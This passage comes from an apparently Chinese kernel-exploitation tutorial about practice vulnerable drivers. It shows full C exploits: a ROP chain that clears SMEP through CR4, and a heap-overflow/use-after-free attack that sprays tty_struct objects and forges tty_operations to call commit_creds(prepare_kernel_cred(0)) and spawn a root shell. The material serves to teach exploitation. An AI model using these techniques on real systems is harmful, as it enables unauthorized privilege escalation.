0xffffffff814e35ef;</div><div class="line">unsigned long swapgs = 0xFFFFFFFF81063694;  // swapgs ; pop rbp ; ret</div><div class="line">unsigned long poprbpret = 0xffffffff8100202b;  //pop rbp, ret</div><div class="line"></div><div class="line"></div><div class="line">unsigned long mmap_base = 0xb0000000;</div><div class="line"></div><div class="line">void get_shell() &#123;</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">void get_root() &#123;</div><div class="line">    commit_creds(prepare_kernel_cred(0));</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* status */</div><div class="line">unsigned long user_cs, user_ss, user_rflags;</div><div class="line">void save_stats() &#123;</div><div class="line">    asm(</div><div class="line">        &quot;movq %%cs, %0\n&quot; // mov rcx, cs</div><div class="line">        &quot;movq %%ss, %1\n&quot; // mov rdx, ss</div><div class="line">        &quot;pushfq\n&quot;        // 把rflags的值压栈</div><div class="line">        &quot;popq %2\n&quot;       // pop rax</div><div class="line">        :&quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rflags) : : &quot;memory&quot; // mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax</div><div class="line">        );</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int fd;</div><div class="line">    char buf[16];</div><div class="line"></div><div class="line">    fd = open(&quot;/dev/vuln&quot;, O_RDWR);</div><div class="line">    if (fd == -1) &#123;</div><div class="line">        printf(&quot;open /dev/vuln device failed!\n&quot;);</div><div class="line">        return -1;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    save_stats();</div><div class="line">    printf(&quot;mmap_addr: %p\n&quot;, mmap(mmap_base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));</div><div class="line">    // 布局 rop 链</div><div class="line">    unsigned long rop_chain[] = &#123;</div><div class="line">        pop_rdi_ret,</div><div class="line">        0x6f0,</div><div class="line">        rdi_to_cr4, // cr4 = 0x6f0</div><div class="line">        mmap_base + 0x10000,</div><div class="line">        (unsigned long)get_root,</div><div class="line">        swapgs, // swapgs; pop rbp; ret</div><div class="line">        mmap_base,   // rbp = base</div><div class="line">        iretq,</div><div class="line">        (unsigned long)get_shell,</div><div class="line">        user_cs,</div><div class="line">        user_rflags,</div><div class="line">        mmap_base + 0x10000,</div><div class="line">        user_ss</div><div class="line">    &#125;;</div><div class="line"></div><div class="line"></div><div class="line">    char * payload = malloc(0x7c + sizeof(rop_chain));</div><div class="line">    memset(payload, 0xf1, 0x7c + sizeof(rop_chain));</div><div class="line">    memcpy(payload + 0x7c, rop_chain, sizeof(rop_chain));</div><div class="line">    write(fd, payload, 0x7c + sizeof(rop_chain));</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>说说 rop 链</p>
+<ul>
+<li>首先使用 <code>pop rdi  &amp;&amp; mov cr4,rdi</code> ，修改 <code>cr4</code>寄存器，关掉 <code>smep</code></li>
+<li>然后 <code>ret2user</code> 去执行用户空间的 <code>get_root</code> 函数，执行  <code>commit_creds(prepare_kernel_cred(0))</code> 完成提权</li>
+<li>然后 <code>swapgs</code> 和 <code>iret</code> 返回用户空间，起一个 <code>root</code> 权限的 <code>shell</code> 。</li>
+</ul>
+<p><strong>参考</strong></p>
+<p><a href="http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/" target="_blank" rel="external">Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric</a></p>
+<h3 id="Rop-By-Heap-Vulnerability"><a href="#Rop-By-Heap-Vulnerability" class="headerlink" title="Rop-By-Heap-Vulnerability"></a>Rop-By-Heap-Vulnerability</h3><h4 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h4><p>首先放源码，位于 <code>heap_bof</code></p>
+<p>驱动的代码基本差不多，区别点主要在  <code>ioctl</code> 处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">char *ptr[40];  // 指针数组，用于存放分配的指针</div><div class="line">struct param</div><div class="line">&#123;</div><div class="line">    size_t len;    // 内容长度</div><div class="line">    char* buf;     // 用户态缓冲区地址</div><div class="line">    unsigned long idx; // 表示 ptr 数组的 索引</div><div class="line">&#125;;</div><div class="line">............................</div><div class="line">............................</div><div class="line">............................</div><div class="line">long bof_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    struct param* p_arg;</div><div class="line">    p_arg = (struct param*)arg;</div><div class="line">    int retval = 0;</div><div class="line">    switch (cmd) &#123;</div><div class="line">        case 9:</div><div class="line">            copy_to_user(p_arg-&gt;buf, ptr[p_arg-&gt;idx], p_arg-&gt;len);</div><div class="line">            printk(&quot;copy_to_user: 0x%x\n&quot;, *(long *)ptr[p_arg-&gt;idx]);</div><div class="line">            break;</div><div class="line">        case 8:</div><div class="line">            copy_from_user(ptr[p_arg-&gt;idx], p_arg-&gt;buf, p_arg-&gt;len);</div><div class="line">            break;</div><div class="line">        case 7:</div><div class="line">            kfree(ptr[p_arg-&gt;idx]);</div><div class="line">            printk(&quot;free: 0x%p\n&quot;, ptr[p_arg-&gt;idx]);</div><div class="line">            break;</div><div class="line">        case 5:</div><div class="line">            ptr[p_arg-&gt;idx] = kmalloc(p_arg-&gt;len, GFP_KERNEL);</div><div class="line">            printk(&quot;alloc: 0x%p, size: %2x\n&quot;, ptr[p_arg-&gt;idx], p_arg-&gt;len);</div><div class="line">            break;</div><div class="line"></div><div class="line">        default:</div><div class="line">            retval = -1;</div><div class="line">            break;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>首先定义了一个 指针数组 <code>ptr[40]</code> ，用于存放<strong>分配的内存地址的指针</strong>。</p>
+<p>实现了驱动的 <code>ioctl</code> 接口来向用户态提供服务。</p>
+<ul>
+<li><code>cmd</code> 为 <code>5</code> 时，根据参数调用 <code>kmalloc</code> 分配内存，然后把分配好的指针，存放在 <code>ptr[p_arg-&gt;idx]</code>, 为了调试的方便，打印了分配到的内存指针</li>
+<li><code>cmd</code>  为 <code>7</code> 时，释放掉 <code>ptr</code> 数组中指定项的指针， <strong><code>kfree</code> 之后没有对 <code>ptr</code> 中的指定项置0</strong>。</li>
+<li><code>cmd</code> 为 <code>8</code>  时，往 <code>ptr</code> 数组中 指定项的指针中<strong>写入 数据，长度不限.</strong></li>
+<li><code>cmd</code> 为 <code>9</code> 时， 获取 指定项 的指针 里面的 数据，然后拷贝到用户空间。</li>
+</ul>
+<p>驱动的漏洞还是很明显的， 堆溢出 以及 <code>UAF</code> .</p>
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><h5 id="slub简述"><a href="#slub简述" class="headerlink" title="slub简述"></a>slub简述</h5><p>要进行利用的话还需要了解 内核的内存分配策略。</p>
+<p>在 <code>linux</code> 内核 <code>2.26</code> 以上的版本，默认使用 <code>slub</code> 分配器进行内存管理。<code>slub</code> 分配器按照零售式的内存分配。他会把大小相近的对象（分配的内存）放到同一个 <code>slab</code> 中进行分配。</p>
+<p>它首先向系统分配一个大的内存，然后把它分成大小相等的内存块进行内存的分配，同时在分配内存时会对分配的大小 向上取整分配。</p>
+<p>可以查看 <code>/proc/slabinfo</code>  获取当前系统 的 <code>slab</code> 信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214248-35c8e256-46fc-1.png" alt="image.png"></p>
+<p>这里介绍下 <code>kmalloc-xxx</code> ，这些 <code>slab</code> 用于给 <code>kmalloc</code> 进行内存分配。 假如要分配 <code>0x2e0</code> ，向上取整就是 <code>kmalloc-1024</code>  所以实际会使用 <code>kmalloc-1024</code>  分配 <code>1024</code> 字节的内存块。</p>
+<p>而且 <code>slub</code> 分配内存不像 <code>glibc</code> 中的<code>malloc</code>，  <code>slub</code> 分配的内存的首部是<strong>没有元数据</strong>的（如果内存块处于释放状态的话会有一个指针，指向下一个 free 的块）。</p>
+<p>所以如果分配几个大小相同的内存块， 它们会紧密排在一起（不考虑内存碎片的情况）。</p>
+<p>给个例子（详细代码可以看最后的 <code>exp</code> ) </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">struct param p;</div><div class="line">p.len = 0x2e0;</div><div class="line">p.buf = malloc(p.len);</div><div class="line">for (int i = 0; i &lt; 10; ++i)</div><div class="line">&#123;</div><div class="line">    p.idx = i;</div><div class="line">    ioctl(fds[i], 5, &amp;p);  // malloc</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这一小段代码的作用是 通过 <code>ioctl</code> 让驱动调用<code>10</code> 次 <code>kmalloc(0x2e0, GFP_KERNEL)</code>，驱动打印出的<strong>分配的地址</strong>如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[    7.095323] alloc: 0xffff8800027ee800, size: 2e0</div><div class="line">[    7.101074] alloc: 0xffff8800027ef000, size: 2e0</div><div class="line">[    7.107161] alloc: 0xffff8800027ef400, size: 2e0</div><div class="line">[    7.111211] alloc: 0xffff8800027ef800, size: 2e0</div><div class="line">[    7.115165] alloc: 0xffff8800027efc00, size: 2e0</div><div class="line">[    7.131237] alloc: 0xffff880002791c00, size: 2e0</div><div class="line">[    7.138591] alloc: 0xffff880003604000, size: 2e0</div><div class="line">[    7.141208] alloc: 0xffff880003604400, size: 2e0</div><div class="line">[    7.146466] alloc: 0xffff880003604800, size: 2e0</div><div class="line">[    7.154290] alloc: 0xffff880003604c00, size: 2e0</div></pre></td></tr></table></figure>
+<p>可以看到除了第一个（内存碎片的原因），其他分配到的内存的地址相距都是 <code>0x400</code>, 这说明内核实际给我的空间是 <code>0x400</code> .</p>
+<p> 尽管我们要分配的是 <code>0x2e0</code> ，实际内核会把大小向上取整 到 <code>0x400</code> </p>
+<p><strong>参考</strong></p>
+<p><a href="https://blog.csdn.net/lukuen/article/details/6935068" target="_blank" rel="external">linux 内核 内存管理 slub算法 （一） 原理</a></p>
+<h5 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h5><p>对于堆溢出和 <code>UAF</code> 漏洞，其实利用思路都差不多，就是想办法修改一些对象的数据，来达到提权的目的，比如改函数表指针然后执行代码提权， 修改 <code>cred</code> 结构体直接提权等。</p>
+<p>这里介绍通过修改 <code>tty_struct</code> 中的 <code>ops</code> 来进行 <code>rop</code> 绕过 <code>smep</code> 提权的技术。</p>
+<p>结构体定义在 <code>linux/tty.h</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">struct tty_struct &#123;</div><div class="line">        int     magic;</div><div class="line">        struct kref kref;</div><div class="line">        struct device *dev;</div><div class="line">        struct tty_driver *driver;</div><div class="line">        const struct tty_operations *ops;</div><div class="line">        int index;</div><div class="line"></div><div class="line">        /* Protects ldisc changes: Lock tty not pty */</div><div class="line">        struct ld_semaphore ldisc_sem;</div><div class="line">        struct tty_ldisc *ldisc;</div><div class="line"></div><div class="line">        struct mutex atomic_write_lock;</div><div class="line">        struct mutex legacy_mutex;</div></pre></td></tr></table></figure>
+<p>其中有一个 <code>ops</code> 项（<code>64bit</code> 下位于 结构体偏移 <code>0x18</code> 处）是一个  <code>struct tty_operations *</code> 结构体。 它里面都是一些函数指针，用户态可以通过一些函数触发这些函数的调用。</p>
+<p>当 <code>open(&quot;/dev/ptmx&quot;,O_RDWR|O_NOCTTY)</code> 内核会分配  <code>tty_struct</code>  结构体，<code>64</code> 位下改结构体的大小为 <code>0x2e0</code>（可以自己编译一个同版本的内核，然后在 <code>gdb</code> 里面看），所以实现代码执行的思路就很简单了</p>
+<ul>
+<li>通过 <code>ioctl</code> 让驱动分配若干个 <code>0x2e0</code> 的 内存块</li>
+<li>释放其中的几个，然后调用若干次 <code>open(&quot;/dev/ptmx&quot;,O_RDWR|O_NOCTTY)</code>  ，会分配若干个 <code>tty_struct</code> , 这时其中的一些 <code>tty_struct</code>  会落在 刚刚释放的那些内存块里面</li>
+<li>利用 驱动中 的 <code>uaf</code> 或者 溢出，修改 修改 <code>tty_struct</code> 的 <code>ops</code> 到我们 <code>mmap</code> 的一块空间，进行 <code>tty_operations</code> 的伪造， 伪造 <code>ops-&gt;ioctl</code> 为 要跳转的位置。</li>
+<li>然后 对 <code>/dev/ptmx</code> 的文件描述符，进行 <code>ioctl</code> ，实现代码执行</li>
+</ul>
+<h5 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h5><p>因为开启了 <code>smep</code> 所以需要先 使用 <code>rop</code> 关闭 <code>smep</code>, 然后在 执行 <code>commit_creds(prepare_kernel_cred(0))</code>  完成提权。</p>
+<p>这里有一个小 <code>tips</code> ，通过 <code>tty_struct</code> 执行 <code>ioctl</code> 时， <code>rax</code> 的值正好是 <code>rip</code> 的值，然后使用 <code>xchg eax,esp;ret</code> 就可以把 <code>rsp</code> 设置为 <code>rax&amp;0xffffffff</code> （其实就是 <code>&amp;ops-&gt;ioctl</code> 的低四个字节）。 </p>
+<p>于是 堆漏洞的 <code>rop</code> 思路如下(假设  <code>xchg_eax_esp</code> 为 <code>xchg eax,esp</code> 指令的地址 )</p>
+<ul>
+<li>首先使用 <code>mmap</code>， 分配 <code>xchg_eax_esp&amp;0xffffffff</code> 作为 <code>fake_stack</code>  并在这里布置好 <code>rop</code> 链</li>
+<li>修改 <code>ops-&gt;ioctl</code> 为 <code>xchg_eax_esp</code> </li>
+<li>触发  <code>ops-&gt;ioctl</code> ， 然后会跳转到 <code>xchg_eax_esp</code> ，此时 <code>rax=rip=xchg_eax_esp</code> ,  执行 <code>xchg eax,esp</code> 后 rsp为 <code>xchg_eax_esp&amp;0xffffffff</code>， 之后就是 根据 事先布置好的 <code>rop chain</code> 进行 <code>rop</code> 了。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line">struct tty_operations &#123;</div><div class="line">    struct tty_struct * (*lookup)(struct tty_driver *driver,</div><div class="line">    struct file *filp, int idx);</div><div class="line">    int (*install)(struct tty_driver *driver, struct tty_struct *tty);</div><div class="line">    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);</div><div class="line">    int (*open)(struct tty_struct * tty, struct file * filp);</div><div class="line">    void (*close)(struct tty_struct * tty, struct file * filp);</div><div class="line">    void (*shutdown)(struct tty_struct *tty);</div><div class="line">    void (*cleanup)(struct tty_struct *tty);</div><div class="line">    int (*write)(struct tty_struct * tty,</div><div class="line">    const unsigned char *buf, int count);</div><div class="line">    int (*put_char)(struct tty_struct *tty, unsigned char ch);</div><div class="line">    void (*flush_chars)(struct tty_struct *tty);</div><div class="line">    int (*write_room)(struct tty_struct *tty);</div><div class="line">    int (*chars_in_buffer)(struct tty_struct *tty);</div><div class="line">    int (*ioctl)(struct tty_struct *tty,</div><div class="line">    unsigned int cmd, unsigned long arg);</div><div class="line">    long (*compat_ioctl)(struct tty_struct *tty,</div><div class="line">    unsigned int cmd, unsigned long arg);</div><div class="line">    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);</div><div class="line">    void (*throttle)(struct tty_struct * tty);</div><div class="line">    void (*unthrottle)(struct tty_struct * tty);</div><div class="line">    void (*stop)(struct tty_struct *tty);</div><div class="line">    void (*start)(struct tty_struct *tty);</div><div class="line">    void (*hangup)(struct tty_struct *tty);</div><div class="line">    int (*break_ctl)(struct tty_struct *tty, int state);</div><div class="line">    void (*flush_buffer)(struct tty_struct *tty);</div><div class="line">    void (*set_ldisc)(struct tty_struct *tty);</div><div class="line">    void (*wait_until_sent)(struct tty_struct *tty, int timeout);</div><div class="line">    void (*send_xchar)(struct tty_struct *tty, char ch);</div><div class="line">    int (*tiocmget)(struct tty_struct *tty);</div><div class="line">    int (*tiocmset)(struct tty_struct *tty,</div><div class="line">    unsigned int set, unsigned int clear);</div><div class="line">    int (*resize)(struct tty_struct *tty, struct winsize *ws);</div><div class="line">    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</div><div class="line">    int (*get_icount)(struct tty_struct *tty,</div><div class="line">    struct serial_icounter_struct *icount);</div><div class="line">    const struct file_operations *proc_fops;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">struct param</div><div class="line">&#123;</div><div class="line">    size_t len;</div><div class="line">    char* buf;</div><div class="line">    unsigned long idx;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);</div><div class="line">typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);</div><div class="line">// 两个函数的地址</div><div class="line">_commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;</div><div class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;</div><div class="line">unsigned long xchg_eax_esp = 0xFFFFFFFF81007808;</div><div class="line">unsigned long rdi_to_cr4 = 0xFFFFFFFF810635B4; // mov cr4, rdi ;pop rbp ; ret</div><div class="line">unsigned long pop_rdi_ret = 0xFFFFFFFF813E7D6F;</div><div class="line">unsigned long iretq = 0xffffffff814e35ef;</div><div class="line">unsigned long swapgs = 0xFFFFFFFF81063694;  // swapgs ; pop rbp ; ret</div><div class="line">unsigned long poprbpret = 0xffffffff8100202b;  //pop rbp, ret</div><div class="line">void get_shell() &#123;</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div><div class="line">void get_root() &#123;</div><div class="line">    commit_creds(prepare_kernel_cred(0));</div><div class="line">&#125;</div><div class="line">/* status */</div><div class="line">unsigned long user_cs, user_ss, user_rflags;</div><div class="line">void save_stats() &#123;</div><div class="line">    asm(</div><div class="line">        &quot;movq %%cs, %0\n&quot; // mov rcx, cs</div><div class="line">        &quot;movq %%ss, %1\n&quot; // mov rdx, ss</div><div class="line">        &quot;pushfq\n&quot;        // 把rflags的值压栈</div><div class="line">        &quot;popq %2\n&quot;       // pop rax</div><div class="line">        :&quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rflags) : : &quot;memory&quot; // mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax</div><div class="line">        );</div><div class="line">&#125;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int fds[10];</div><div class="line">    int ptmx_fds[0x100];</div><div class="line">    char buf[8];</div><div class="line">    int fd;</div><div class="line"></div><div class="line">    unsigned long mmap_base = xchg_eax_esp &amp; 0xffffffff;</div><div class="line"></div><div class="line">    struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));</div><div class="line"></div><div class="line">    memset(fake_tty_operations, 0, sizeof(struct tty_operations));</div><div class="line">    fake_tty_operations-&gt;ioctl = (unsigned long) xchg_eax_esp; // 设置tty的ioctl操作为栈转移指令</div><div class="line">    fake_tty_operations-&gt;close = (unsigned long)xchg_eax_esp;</div><div class="line"></div><div class="line">    for (int i = 0; i &lt; 10; ++i)</div><div class="line">    &#123;</div><div class="line">        fd = open(&quot;/dev/bof&quot;, O_RDWR);</div><div class="line">        if (fd == -1) &#123;</div><div class="line">            printf(&quot;open bof device failed!\n&quot;);</div><div class="line">            return -1;</div><div class="line">        &#125;</div><div class="line">        fds[i] = fd;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">   printf(&quot;%p\n&quot;, fake_tty_operations);</div><div class="line"></div><div class="line">    save_stats();</div><div class="line">    printf(&quot;mmap_addr: %p\n&quot;, mmap(mmap_base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));</div><div class="line">    // 布局 rop 链</div><div class="line">    unsigned long rop_chain[] = &#123;</div><div class="line">        pop_rdi_ret,</div><div class="line">        0x6f0,</div><div class="line">        rdi_to_cr4, // cr4 = 0x6f0</div><div class="line">        mmap_base + 0x10000,</div><div class="line">        (unsigned long)get_root,</div><div class="line">        swapgs, // swapgs; pop rbp; ret</div><div class="line">        mmap_base,   // rbp = base</div><div class="line">        iretq,</div><div class="line">        (unsigned long)get_shell,</div><div class="line">        user_cs,</div><div class="line">        user_rflags,</div><div class="line">        mmap_base + 0x10000,</div><div class="line">        user_ss</div><div class="line">    &#125;;</div><div class="line">    // 触发漏洞前先把 rop 链拷贝到 mmap_base</div><div class="line">    memcpy(mmap_base, rop_chain, sizeof(rop_chain));</div><div class="line"></div><div class="line">    struct param p;</div><div class="line">    p.len = 0x2e0;</div><div class="line">    p.buf = malloc(p.len);</div><div class="line"></div><div class="line">    // 让驱动分配 10 个 0x2e0  的内存块</div><div class="line">    for (int i = 0; i &lt; 10; ++i)</div><div class="line">    &#123;</div><div class="line">        p.idx = i;</div><div class="line">        ioctl(fds[i], 5, &amp;p);  // malloc</div><div class="line">    &#125;</div><div class="line">    // 释放中间的几个</div><div class="line">    for (int i = 2; i &lt; 6; ++i)</div><div class="line">    &#123;</div><div class="line">        p.idx = i;</div><div class="line">        ioctl(fds[i], 7, &amp;p); // free</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 批量 open /dev/ptmx, 喷射 tty_struct</div><div class="line">    for (int i = 0; i &lt; 0x100; ++i)</div><div class="line">    &#123;</div><div class="line">        ptmx_fds[i] = open(&quot;/dev/ptmx&quot;,O_RDWR|O_NOCTTY);</div><div class="line">        if (ptmx_fds[i]==-1)</div><div class="line">        &#123;</div><div class="line">            printf(&quot;open ptmx err\n&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    p.idx = 2;</div><div class="line">    p.len = 0x20;</div><div class="line">    ioctl(fds[4], 9, &amp;p);</div><div class="line"></div><div class="line">    // 此时如果释放后的内存被 tty_struct</div><div class="line">    // 占用，那么他的开始字节序列应该为</div><div class="line">    //</div><div class="line">    for (int i = 0; i &lt; 16; ++i)</div><div class="line">    &#123;</div><div class="line">        printf(&quot;%2x &quot;, p.buf[i]);</div><div class="line">    &#125;</div><div class="line">    printf(&quot;\n&quot;);</div><div class="line">    // 批量修改 tty_struct 的 ops 指针 </div><div class="line">    unsigned long *temp = (unsigned long *)&amp;p.buf[24];</div><div class="line">    *temp = (unsigned long)fake_tty_operations;</div><div class="line">    for (int i = 2; i &lt; 6; ++i)</div><div class="line">    &#123;</div><div class="line">        p.idx = i;</div><div class="line">        ioctl(fds[4], 8, &amp;p);</div><div class="line">    &#125;</div><div class="line">    // getchar();</div><div class="line">    for (int i = 0; i &lt; 0x100; ++i)</div><div class="line">    &#123;</div><div class="line">        ioctl(ptmx_fds[i], 0, 0);</div><div class="line">    &#125;</div><div class="line">    getchar();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>参考</strong></p>
+<p><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="external">一道简单内核题入门内核利用</a></p>
+<h2 id="利用-thread-info-gt-addr-limit"><a href="#利用-thread-info-gt-addr-limit" class="headerlink" title="利用 thread_info-&gt;addr_limit"></a>利用 thread_info-&gt;addr_limit</h2><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><p>这里使用的代码就是 <strong>内核模块创建与调试</strong> 中的示例代码。</p>
+<p>代码中大部分都是用来测试一些内核函数，其中对本节内容有效的代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">long arw_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)</div><div class="line">&#123;</div><div class="line">    .....................</div><div class="line">    .....................</div><div class="line">    .....................</div><div class="line">    switch (cmd) &#123;</div><div class="line">        .....................</div><div class="line">        .....................</div><div class="line">        .....................</div><div class="line">        case 5:</div><div class="line">            p_arg = (struct param*)arg;</div><div class="line">            p_stack = (long)&amp;retval;</div><div class="line">            p_stack = p_stack&amp;0xFFFFFFFFFFFFC000;</div><div class="line">            info = (struct thread_info * )p_stack;</div><div class="line">            </div><div class="line">            printk(&quot;addr_limit&apos;s addr: 0x%p\n&quot;, &amp;info-&gt;addr_limit);</div><div class="line">            memset(&amp;info-&gt;addr_limit, 0xff, 0x8);</div><div class="line">            // 返回 thread_info 的地址， 模拟信息泄露</div><div class="line">            put_user(info, &amp;p_arg-&gt;addr);</div><div class="line">            break;</div></pre></td></tr></table></figure>
+<h4 id="利用栈地址拿到-thread-info-的地址"><a href="#利用栈地址拿到-thread-info-的地址" class="headerlink" title="利用栈地址拿到 thread_info 的地址"></a>利用栈地址拿到 thread_info 的地址</h4><p>首先模拟了一个内核的信息泄露。</p>
